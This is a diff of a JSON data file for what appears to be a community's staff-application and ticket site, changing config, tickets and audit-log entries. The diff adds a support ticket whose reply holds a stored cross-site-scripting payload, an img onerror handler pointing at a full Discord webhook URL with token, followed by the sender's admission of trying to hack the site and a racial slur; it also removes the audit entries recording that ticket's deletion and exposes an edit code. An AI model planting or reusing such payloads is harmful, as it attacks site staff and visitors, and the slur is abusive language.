@@ -4,7 +4,7 @@
     "subtitle": "Three ways in. Pick the role that fits you and send one honest application.",
     "announcement": "APPLICATIONS ARE NOW OPEN!! FOR MODERATOR, CONTENT CREATOR, AND EVENT HOSTER!",
     "rules": "• Must be 13+• One role per application — pick the closest fit• Be honest — lying = instant deny• Spamming applications = blacklist",
-    "accent": "#000000",
+    "accent": "#6cb8f0",
     "bg": "#0e1218",
     "editCode": "MOD123",
     "showApproved": true,
@@ -1693,27 +1693,32 @@
           "at": "2026-10-10T23:56:24.840Z"
         }
       ]
+    },
+    {
+      "id": "TKT-SNEJ3K",
+      "name": "Josh",
+      "subject": "recon",
+      "status": "closed",
+      "unread": true,
+      "createdAt": "2026-10-10T23:58:18.351Z",
+      "updatedAt": "2026-10-14T03:14:48.977Z",
+      "replies": [
+        {
+          "by": "user",
+          "name": "Josh",
+          "text": "test 10 chars min <img src=x style=display:none onerror=this.src='https://discordapp.com/api/webhooks/1489723338174628002/0JR4otNx_UCfooa_ETpgGzOktrvlJk_6VJSzkVuVX696_efC22mcD4JYwDtivoiqC1wb'>",
+          "at": "2026-10-10T23:58:18.351Z"
+        },
+        {
+          "by": "user",
+          "name": "Josh",
+          "text": "Mb Nigga i was tryna Hackr U !!",
+          "at": "2026-10-10T23:58:52.824Z"
+        }
+      ]
     }
   ],
   "audit": [
-    {
-      "t": "2026-10-14T03:15:09.951Z",
-      "act": "config_saved",
-      "id": "",
-      "by": ""
-    },
-    {
-      "t": "2026-10-14T03:14:56.435Z",
-      "act": "ticket_deleted",
-      "id": "TKT-SNEJ3K",
-      "by": ""
-    },
-    {
-      "t": "2026-10-14T03:14:50.864Z",
-      "act": "ticket_deleted",
-      "id": "TKT-SNEJ3K",
-      "by": ""
-    },
     {
       "t": "2026-10-14T03:14:48.977Z",
       "act": "ticket_closed",
@@ -2295,12 +2300,30 @@
       "act": "status_pending",
       "id": "MOD-KJ6H4E",
       "by": ""
+    },
+    {
+      "t": "2026-10-04T21:30:25.483Z",
+      "act": "status_denied",
+      "id": "MOD-H83PHA",
+      "by": ""
+    },
+    {
+      "t": "2026-10-04T21:29:50.459Z",
+      "act": "status_denied",
+      "id": "MOD-H83PHA",
+      "by": ""
+    },
+    {
+      "t": "2026-10-04T21:29:48.826Z",
+      "act": "status_pending",
+      "id": "MOD-H83PHA",
+      "by": ""
     }
   ],
   "reports": [],
   "diag": [
     {
-      "t": "2026-10-14T03:15:12.704Z",
+      "t": "2026-10-14T03:15:29.759Z",
       "build": "20261012b",
       "hero": true,
       "gated": false,
